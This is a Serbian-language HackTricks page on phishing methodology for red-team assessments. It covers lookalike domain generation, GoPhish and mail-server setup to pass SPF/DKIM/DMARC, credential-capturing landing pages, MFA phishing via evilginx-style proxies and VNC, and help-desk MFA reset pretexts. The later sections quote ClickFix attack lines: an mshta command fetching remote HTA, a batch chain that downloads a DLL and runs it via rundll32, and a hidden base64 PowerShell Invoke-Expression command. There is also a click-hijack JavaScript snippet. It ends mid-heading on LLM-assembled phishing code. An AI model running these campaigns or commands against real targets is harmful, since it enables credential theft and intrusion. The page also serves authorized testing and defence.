# Phishing metodologija

{{#include ../../banners/hacktricks-training.md}}

## Metodologija

1. Izvršite izviđanje žrtve
   1. Izaberite **domen žrtve**.
   2. Obavite osnovno web enumerisanje **i potražite portale za prijavu** koje žrtva koristi, pa **odlučite** koji ćete **imitirati**.
   3. Koristite **OSINT** da **pronađete email adrese**.
2. Pripremite okruženje
   1. **Kupite domen** koji ćete koristiti za phishing procenu
   2. **Konfigurišite zapise** povezane sa email servisom (SPF, DMARC, DKIM, rDNS)
   3. Konfigurišite VPS sa **gophish**
3. Pripremite kampanju
   1. Pripremite **email šablon**
   2. Pripremite **web stranicu** za krađu akreditiva
4. Pokrenite kampanju!

## Generisanje sličnih naziva domena ili kupovina pouzdanog domena

### Tehnike variranja naziva domena

- **Ključna reč**: Naziv domena **sadrži** važnu **ključnu reč** iz originalnog domena (npr. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Poddomen sa crticom**: Zamenite **tačku crticom** u poddomenu (npr. www-zelster.com).
- **Novi TLD**: Isti domen sa **novim TLD-om** (npr. zelster.org)
- **Homoglif**: **Zamenite** slovo u nazivu domena **slovima koja izgledaju slično** (npr. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transpozicija:** **Zamenite mesta dvama slovima** u nazivu domena (npr. zelsetr.com).
- **Jednina/množina**: Dodajte ili uklonite „s“ na kraju naziva domena (npr. zeltsers.com).
- **Izostavljanje**: **Uklonite jedno** slovo iz naziva domena (npr. zelser.com).
- **Ponavljanje:** **Ponovite jedno** slovo u nazivu domena (npr. zeltsser.com).
- **Zamena**: Slično kao homoglif, ali manje neprimetno. Zamenite jedno slovo u nazivu domena, na primer slovom koje se na tastaturi nalazi blizu originalnog slova (npr. zektser.com).
- **Umetanje tačke u domen**: Umetnite **tačku** unutar naziva domena (npr. ze.lster.com).
- **Umetanje slova**: **Umetnite slovo** u naziv domena (npr. zerltser.com).
- **Nedostajuća tačka**: Dodajte TLD na naziv domena (npr. zelstercom.com)

**Automatski alati**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Veb-sajtovi**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Postoji **mogućnost da se neki bitovi u memoriji ili tokom komunikacije automatski promene** usled različitih faktora, kao što su solarne baklje, kosmički zraci ili hardverske greške.

Kada se ovaj koncept **primeni na DNS zahteve**, moguće je da **domen koji primi DNS server** nije isti kao domen koji je prvobitno zatražen.

Na primer, izmena jednog bita u domenu „windows.com“ može da ga promeni u „windnws.com“.

Napadači mogu **da iskoriste ovo tako što će registrovati više domena nastalih promenom bitova** koji su slični domenu žrtve. Namera im je da preusmere legitimne korisnike na sopstvenu infrastrukturu.

Za više informacija pročitajte [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Kupovina pouzdanog domena

Na [https://www.expireddomains.net/](https://www.expireddomains.net) možete potražiti istekli domen koji biste mogli da koristite.\
Da biste proverili da li istekli domen koji nameravate da kupite **već ima dobar SEO**, možete da proverite kako je kategorizovan na sledećim sajtovima:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Pronalaženje email adresa

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% besplatno)
- [https://phonebook.cz/](https://phonebook.cz) (100% besplatno)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Da biste **pronašli još** važećih email adresa ili **proverili one** koje ste već pronašli, možete da proverite da li možete da ih brute-force-ujete preko SMTP servera žrtve. [Ovde saznajte kako da proverite/pronađete email adrese](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Takođe, ne zaboravite da ako korisnici koriste **neki web portal za pristup emailu**, možete da proverite da li je ranjiv na **brute force napade na korisnička imena** i da iskoristite ranjivost ako je to moguće.

## Konfigurisanje GoPhish

### Instalacija

Možete ga preuzeti sa [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Preuzmite ga, raspakujte u `/opt/gophish` i pokrenite `/opt/gophish/gophish`\
U izlazu će vam biti prikazana lozinka za admin korisnika na portu 3333. Zato pristupite tom portu i upotrebite te akreditive da promenite admin lozinku. Možda ćete morati da tunelujete taj port do lokalne mašine:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Konfiguracija

**Konfiguracija TLS sertifikata**

Pre ovog koraka trebalo bi da ste **već kupili domen** koji ćete koristiti i da on **pokazuje** na **IP adresu VPS-a** na kojem konfigurišete **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Konfiguracija pošte**

Započnite instalacijom: `apt-get install postfix`

Zatim dodajte domen u sledeće datoteke:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Promenite i vrednosti sledećih promenljivih u datoteci /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na kraju izmenite datoteke **`/etc/hostname`** i **`/etc/mailname`** tako da sadrže ime vašeg domena i **restartujte VPS.**

Sada napravite **DNS A record** za `mail.<domain>` koji pokazuje na **IP adresu** VPS-a i **DNS MX** record koji pokazuje na `mail.<domain>`

Sada testirajmo slanje e-pošte:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish konfiguracija**

Zaustavite gophish i konfigurišimo ga.\
Izmenite `/opt/gophish/config.json` ovako (obratite pažnju na korišćenje https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Konfigurisanje gophish servisa**

Da biste kreirali gophish servis kako bi mogao automatski da se pokreće i njime upravlja kao servisom, možete da kreirate datoteku `/etc/init.d/gophish` sa sledećim sadržajem:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Dovršite konfigurisanje servisa i proverite ga tako što ćete:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Konfigurisanje mail servera i domena

### Sačekajte i budite legitimni

Što je domen stariji, manja je verovatnoća da će biti označen kao spam. Zato treba da sačekate što je duže moguće (najmanje 1 nedelju) pre phishing procene. Štaviše, ako postavite stranicu o sektoru sa dobrom reputacijom, stečena reputacija biće bolja.

Imajte na umu da, čak i ako morate da sačekate nedelju dana, sve možete da konfigurišete već sada.

### Konfigurisanje Reverse DNS (rDNS) zapisa

Postavite rDNS (PTR) zapis koji razrešava IP adresu VPS-a u ime domena.

### Sender Policy Framework (SPF) zapis

Morate **da konfigurišete SPF zapis za novi domen**. Ako ne znate šta je SPF zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Možete da koristite [https://www.spfwizard.net/](https://www.spfwizard.net) da generišete SPF policy (koristite IP adresu VPS mašine)

![SPF Wizard obrazac za generisanje SPF zapisa za phishing domen](<../../images/image (1037).png>)

Ovaj sadržaj treba da bude postavljen unutar TXT zapisa u domenu:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Zapis Domain-based Message Authentication, Reporting & Conformance (DMARC)

Morate **da konfigurišete DMARC zapis za novi domen**. Ako ne znate šta je DMARC zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Morate da kreirate novi DNS TXT zapis koji pokazuje na hostname `_dmarc.<domain>` sa sledećim sadržajem:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Morate **da konfigurišete DKIM za novi domen**. Ako ne znate šta je DKIM zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ovaj vodič je zasnovan na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Potrebno je da spojite obe B64 vrednosti koje generiše DKIM ključ:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Proverite ocenu konfiguracije e-pošte

To možete da uradite pomoću [https://www.mail-tester.com/](https://www.mail-tester.com)\
Samo otvorite stranicu i pošaljite e-poruku na adresu koju vam daju:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Možete i da **proverite konfiguraciju emaila** tako što ćete poslati email na `check-auth@verifier.port25.com` i **pročitati odgovor** (za ovo ćete morati da otvorite port **25** i pogledate odgovor u datoteci _/var/mail/root_ ako email pošaljete kao root).\
Proverite da li ste prošli sve testove:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Takođe možete poslati **poruku na Gmail nalog koji kontrolišete** i proveriti **zaglavlja e-pošte** u Gmail prijemnom sandučetu. U polju zaglavlja `Authentication-Results` trebalo bi da bude prisutno `dkim=pass`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Uklanjanje sa Spamhaus crne liste

Stranica [www.mail-tester.com](https://www.mail-tester.com) može da vam kaže da li Spamhaus blokira vaš domen. Možete da zatražite uklanjanje domena/IP adrese na: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Uklanjanje sa Microsoft crne liste

​​Možete da zatražite uklanjanje domena/IP adrese na [https://sender.office.com/](https://sender.office.com).

## Kreiranje i pokretanje GoPhish kampanje

### Profil za slanje

- Unesite **naziv po kom ćete prepoznati** profil pošiljaoca
- Odlučite sa kog naloga ćete slati phishing imejlove. Predlozi: _noreply, support, servicedesk, salesforce..._
- Polja za korisničko ime i lozinku možete da ostavite prazna, ali obavezno označite Ignore Certificate Errors

![Kreiranje i pokretanje GoPhish kampanje - Profil za slanje: Polja za korisničko ime i lozinku možete da ostavite prazna, ali obavezno označite Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Preporučuje se da koristite funkciju "**Send Test Email**" kako biste proverili da sve radi.\
> Preporučujem da **testne imejlove šaljete na adrese za 10min mail**, kako biste izbegli stavljanje na crnu listu tokom testiranja.

### Šablon imejla

- Unesite **naziv po kom ćete prepoznati** šablon
- Zatim napišite **naslov** (ništa neobično, samo nešto što biste očekivali u običnom imejlu)
- Proverite da li je označena opcija "**Add Tracking Image**"
- Napišite **šablon imejla** (možete da koristite promenljive kao u primeru ispod):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Imajte na umu da se, **kako bi se povećala uverljivost imejla**, preporučuje korišćenje potpisa iz nekog imejla klijenta. Predlozi:

- Pošaljite imejl na **nepostojeću adresu** i proverite da li odgovor sadrži potpis.
- Potražite **javne imejl adrese** kao što su info@ex.com, press@ex.com ili public@ex.com, pošaljite im imejl i sačekajte odgovor.
- Pokušajte da kontaktirate neku **pronađenu važeću** imejl adresu i sačekajte odgovor.

![Sending Profile - Email Template: Pokušajte da kontaktirate neku pronađenu važeću imejl adresu i sačekajte odgovor](<../../images/image (80).png>)

> [!TIP]
> Email Template omogućava i **dodavanje fajlova u prilogu za slanje**. Ako želite i da ukradete NTLM izazove pomoću posebno pripremljenih fajlova/dokumenata, [pročitajte ovu stranicu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Odredišna stranica

- Unesite **ime**
- **Napišite HTML kod** veb-stranice. Imajte na umu da možete i da **uvezete** veb-stranice.
- Označite **Capture Submitted Data** i **Capture Passwords**
- Podesite **preusmeravanje**

![Email Template - Landing Page: Označite Capture Submitted Data i Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Obično ćete morati da izmenite HTML kod stranice i testirate ga lokalno (možda pomoću Apache servera) **dok ne budete zadovoljni rezultatima.** Zatim unesite taj HTML kod u polje.\
> Imajte na umu da, ako HTML koristi **statičke resurse** (na primer, CSS i JS stranice), možete da ih sačuvate u _**/opt/gophish/static/endpoint**_ i zatim im pristupite preko _**/static/\<filename>**_

> [!TIP]
> Za preusmeravanje možete **preusmeriti korisnike na legitimnu glavnu veb-stranicu žrtve** ili, na primer, na _/static/migration.html_, prikazati **kružni indikator učitavanja (**[**https://loading.io/**](https://loading.io)**) tokom 5 sekundi, a zatim prikazati poruku da je proces uspešno završen**.

### Korisnici i grupe

- Unesite ime
- **Uvezite podatke** (imajte na umu da su za korišćenje šablona iz primera potrebni ime, prezime i imejl adresa svakog korisnika)

![Landing Page - Users & Groups: Uvezite podatke (imajte na umu da su za korišćenje šablona iz primera potrebni ime, prezime i imejl adresa svakog korisnika)](<../../images/image (163).png>)

### Kampanja

Na kraju, kreirajte kampanju tako što ćete izabrati ime, šablon imejla, odredišnu stranicu, URL, profil za slanje i grupu. Imajte na umu da će URL biti link poslat žrtvama.

Imajte na umu da **Sending Profile omogućava slanje probnog imejla kako biste videli kako će izgledati konačni phishing imejl**:

![Users & Groups - Campaign: Imajte na umu da Sending Profile omogućava slanje probnog imejla kako biste videli kako će izgledati konačni phishing imejl](<../../images/image (192).png>)

Kada sve bude spremno, pokrenite kampanju!

## Kloniranje veb-sajta

Ako iz nekog razloga želite da klonirate veb-sajt, pogledajte sledeću stranicu:


{{#ref}}
clone-a-website.md
{{#endref}}

## Dokumenti i fajlovi sa backdoor-om

U nekim phishing procenama (uglavnom za Red Teams) možda ćete želeti i da **pošaljete fajlove koji sadrže neki oblik backdoor-a** (možda C2 ili samo nešto što će pokrenuti autentifikaciju).\
Na sledećoj stranici možete pronaći nekoliko primera:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Preko Proxy MitM

Prethodni napad je prilično domišljat jer se predstavljate kao pravi veb-sajt i prikupljate podatke koje korisnik unese. Nažalost, ako korisnik ne unese ispravnu lozinku ili ako je aplikacija koju ste lažirali podešena sa 2FA, **ovi podaci vam neće omogućiti da se predstavljate kao prevareni korisnik**.

Tu su korisni alati kao što su [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovaj alat omogućava izvođenje napada nalik MitM-u. Napad u osnovi funkcioniše ovako:

1. **Predstavljate se kao obrazac za prijavu** na pravoj veb-stranici.
2. Korisnik **šalje** svoje **akreditive** na vašu lažnu stranicu, a alat ih šalje pravoj veb-stranici i **proverava da li akreditivi važe**.
3. Ako je nalog podešen sa **2FA**, MitM stranica će zatražiti kod; kada ga **korisnik unese**, alat će ga poslati pravoj veb-stranici.
4. Kada se korisnik autentifikuje, vi ćete kao napadač **prikupiti akreditive, 2FA kod, kolačić i sve informacije iz svake njegove interakcije dok alat izvodi MitM napad**.

### Preko VNC-a

Šta ako žrtvu, umesto da je **pošaljete na zlonamernu stranicu** koja izgleda kao originalna, pošaljete na **VNC sesiju sa pregledačem povezanim sa pravom veb-stranicom**? Moći ćete da vidite šta radi i ukradete lozinku, korišćeni MFA, kolačiće...\
To možete da uradite pomoću [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Otkrivanje da ste otkriveni

Očigledno, jedan od najboljih načina da saznate da li ste raskrinkani jeste da **proverite da li se vaš domen nalazi na crnim listama**. Ako se tamo nalazi, znači da je vaš domen nekako označen kao sumnjiv.\
Jednostavan način da proverite da li se vaš domen nalazi na nekoj crnoj listi jeste da koristite [https://malwareworld.com/](https://malwareworld.com)

Postoje i drugi načini da saznate da li žrtva **aktivno traži sumnjive phishing aktivnosti u javno dostupnom prostoru**, kao što je objašnjeno na:


{{#ref}}
detecting-phising.md
{{#endref}}

Možete da **kupite domen sa imenom veoma sličnim domenu žrtve** i/ili da **generišete sertifikat** za **poddomen** domena koji kontrolišete, a koji **sadrži** **ključnu reč** iz domena žrtve. Ako žrtva ostvari bilo kakvu **DNS ili HTTP interakciju** sa njima, znaćete da **aktivno traži** sumnjive domene i moraćete da budete veoma neprimetni.<sup>[[2]](#references)</sup>

### Procena phishing imejla

Koristite [**Phishious** ](https://github.com/Rices/Phishious)da biste procenili da li će vaš imejl završiti u folderu za neželjenu poštu, biti blokiran ili uspešno isporučen.

## Kompromitovanje identiteta uz direktan kontakt (resetovanje MFA preko help deska)

Savremeni skupovi upada sve češće u potpunosti zaobilaze imejl mamce i **direktno ciljaju tokove rada službe za podršku / oporavka identiteta** kako bi zaobišli MFA. Napad se u potpunosti oslanja na „living-off-the-land“ pristup: kada napadač preuzme važeće akreditive, nastavlja napad pomoću ugrađenih administratorskih alata — malware nije potreban.<sup>[[6]](#references)</sup>

### Tok napada
1. Istražite žrtvu
   * Prikupite lične i poslovne podatke sa LinkedIn-a, iz curenja podataka, javnog GitHub-a itd.
   * Identifikujte identitete visoke vrednosti (rukovodioce, IT osoblje, finansijsko osoblje) i utvrdite **tačan postupak help deska** za resetovanje lozinke / MFA.
2. Društveni inženjering u realnom vremenu
   * Pozovite help desk, kontaktirajte ga preko Teams-a ili četovanja i lažno se predstavite kao meta (često uz **lažiranje ID-a pozivaoca** ili **klonirani glas**).
   * Navedite prethodno prikupljene lične podatke kako biste prošli proveru identiteta zasnovanu na znanju.
   * Ubedite operatera da **resetuje MFA tajnu** ili izvrši **SIM swap** registrovanog mobilnog broja.
3. Neposredne aktivnosti nakon pristupa (≤60 min u stvarnim slučajevima)
   * Uspostavite uporište preko bilo kog veb-portala za SSO.
   * Nabrojte AD / AzureAD pomoću ugrađenih alata (bez ispuštanja binarnih fajlova):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateralno kretanje pomoću **WMI**, **PsExec** ili legitimnih **RMM** agenata koji su već na allowlisti u okruženju.

### Detekcija i ublažavanje
* Tretirajte oporavak identiteta preko help-deska kao **privilegovanu operaciju** – zahtevajte dodatnu autentifikaciju (step-up auth) i odobrenje menadžera.
* Uvedite pravila za **Identity Threat Detection & Response (ITDR)** / **UEBA** koja šalju upozorenja za:  
  * Promenu MFA metode + autentifikaciju sa novog uređaja / lokacije.  
  * Neposredno podizanje privilegija istog principal-a (korisnik-→-admin).  
* Snimajte pozive help-desku i zahtevajte **uzvratni poziv na već registrovani broj** pre bilo kakvog resetovanja.
* Uvedite **Just-In-Time (JIT) / Privileged Access** kako resetovani nalozi ne bi automatski dobijali tokene sa visokim privilegijama.

---

## Obmana velikih razmera – SEO Poisoning i „ClickFix“ kampanje
Grupe koje koriste široko dostupne alate nadoknađuju troškove ciljanih operacija masovnim napadima koji **pretraživače i oglasne mreže pretvaraju u kanal za isporuku**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** postavlja lažni rezultat, kao što je `chromium-update[.]site`, na vrh oglasa u rezultatima pretrage.
2. Žrtva preuzima mali **loader prve faze** (često JS/HTA/ISO). Primeri koje je zabeležio Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader eksfiltruje kolačiće pregledača i baze podataka akreditiva, a zatim preuzima **tihi loader** koji *u realnom vremenu* odlučuje da li će instalirati:
   * RAT (npr. AsyncRAT, RustDesk)
   * ransomware / wiper
   * komponentu za postojanost (ključ Run u registru + zakazani zadatak)

### Saveti za ojačavanje bezbednosti
* Blokirajte novoregistrovane domene i primenite **Advanced DNS / URL Filtering** na *oglase u pretrazi*, kao i na e-poštu.
* Ograničite instalaciju softvera na potpisane MSI / Store pakete, a pravilima zabranite izvršavanje `HTA`, `ISO`, `VBS` fajlova.
* Pratite podređene procese pregledača koji pokreću instalacione programe:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Tražite LOLBins koje često zloupotrebljavaju loaderi prve faze (npr. `regsvr32`, `curl`, `mshta`).

### Preotimanje klika na dugme za preuzimanje uz prosleđivanje TDS-u
Neki lažni softverski portali ostavljaju vidljivi `href` za preuzimanje usmeren na **pravi** GitHub/URL izdanja, ali JavaScript-om preotimaju **prvu** korisničku interakciju i šalju žrtvu u lanac **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Ključne osobine:
- Hook se obično izvršava u **capture fazi** (`true`) na objektu `document`, pa se aktivira pre handlera sajta.
- Chrome često koristi `mousedown` umesto `click` da bi preusmeravanje bilo povezano sa važećim **korisničkim gestom** i da bi se povećala verovatnoća zaobilaženja blokatora iskačućih prozora.
- Neke varijante unapred otvaraju `about:blank` ili simuliraju klikove na `<a target="_blank">`, pa tek kasnije postavljaju TDS URL.
- Ograničenja na strani browsera često se čuvaju u `localStorage`, pa **prvi klik** može da vodi do malware-a, dok se pri osvežavanju stranice ili ponovnim pokušajima koristi bezbedno izgledajući vidljivi link.
- TDS može da proverava referrer, ulazni domen, GEO, otisak browsera/uređaja, VPN/datacenter, kontekst klika i brojače po sesiji, zbog čega ponovljena analitička testiranja daju nepredvidive rezultate.

Ideje za odbranu:
- Uporedite prikazani `href` sa stvarnim ciljem navigacije koji se generiše u trenutku klika.
- Tražite handlere `document.addEventListener(..., true)` koji pozivaju i `preventDefault()` i `stopImmediatePropagation()` oko `window.open`, `about:blank` ili simuliranih klikova na anchor elemente.
- Grupe novo registrovanih domena za preuzimanje softvera koji svi učitavaju isti CloudFront/JS stage predstavljaju snažan signal za SEO trovanje/TDS obrazac.

### ClickFix sa lažnih stranica za verifikaciju + LOLBAS preuzimanja koja izgledaju kao arhive
Neke grane TDS-a vode do lažne stranice za verifikaciju (u stilu Cloudflare/IUAM), koja nalaže žrtvi da pokrene pouzdan Windows binarni fajl kao što je:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Napomene:
- `mshta.exe` izvršava **HTA/VBScript na početku odgovora**, čak i ako se URL predstavlja kao `.7z` arhiva; naknadno dodati podaci arhive mogu biti samo mamac.
- Naredne faze često i dalje lažno prikazuju tip datoteke (`.rtf` za PowerShell, `.asar` za Python, ZIP arhive sa binarnim datotekama dopunjenim do veće veličine), a zatim prelaze na **ručno mapiranje PE-a / izvršavanje u memoriji**.
- Ako reagujete na jedan od ovih lanaca, sačuvajte **mrežni saobraćaj i memoriju od prvog uspešnog pokretanja**: kasnija ponavljanja mogu prikazati samo bezazleni put instalacionog programa/SFX-a ili ne uspeti jer je isporuka payload-a/ključa bila vezana za originalnu TDS sesiju.

### Taktike isporuke ClickFix DLL-a (lažno CERT ažuriranje)
* Mamac: klonirano saopštenje nacionalnog CERT-a sa dugmetom **Update** koje prikazuje detaljna uputstva za „popravku“. Žrtvama se nalaže da pokrenu batch skriptu koja preuzima DLL i izvršava ga pomoću `rundll32`.<sup>[[12]](#references)</sup>
* Uočeni tipični batch lanac:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` preuzima payload u `%TEMP%`, kratko čekanje prikriva mrežni jitter, a zatim `rundll32` poziva izvezenu ulaznu tačku (`notepad`).
* DLL šalje identitet hosta i proverava C2 svakih nekoliko minuta. Udaljene komande stižu kao **base64-encoded PowerShell** i izvršavaju se skriveno, uz zaobilaženje policy-ja:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Ovo čuva fleksibilnost C2 (server može da zameni zadatke bez ažuriranja DLL-a) i skriva prozore konzole. Potražite PowerShell procese-potomke procesa `rundll32.exe` koji zajedno koriste `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Branioci mogu da traže HTTP(S) callback-ove oblika `...page.php?tynor=<COMPUTER>sss<USER>` i intervale provere od 5 minuta nakon učitavanja DLL-a.

---

## Phishing operacije unapređene AI-jem
Napadači sada kombinuju **LLM i API-je za kloniranje glasa** kako bi kreirali potpuno personalizovane mamce i ostvarili interakciju u realnom vremenu.

| Sloj | Primer upotrebe od strane aktera pretnje |
|-------|-----------------------------|
|Automatizacija|Generisanje i slanje više od 100 hiljada e-poruka / SMS poruka sa nasumično izmenjenim tekstom i linkovima za praćenje.|
|Generativna AI|Kreiranje *jednokratnih* e-poruka koje pominju javne M&A poslove i interne šale sa društvenih mreža; deep-fake glas direktora u prevarama s povratnim pozivom.|
|Agentna AI|Autonomno registrovanje domena, prikupljanje obaveštajnih podataka iz javnih izvora i sastavljanje narednih e-poruka kada žrtva klikne, ali ne unese creds.|

**Odbrana:**  
• Dodajte **dinamičke banere** koji ističu poruke poslate nepouzdanom automatizacijom (putem anomalija u ARC/DKIM-u).  
• Uvedite **fraze za proveru glasovnom biometrijom** za telefonske zahteve visokog rizika.  
• Neprestano simulirajte AI-generisane mamce u programima podizanja svesti – statični predlošci su zastareli.

Pogledajte i – zloupotrebu agentnog pregledanja za phishing radi krađe kredencijala:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Pogledajte i – zloupotrebu lokalnih CLI alata i MCP-a od strane AI agenata (za inventarisanje tajni i detekciju):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Sklapanje phishing JavaScript-a tokom izvršavanja uz pomoć LLM-a (codegen u pregledaču)

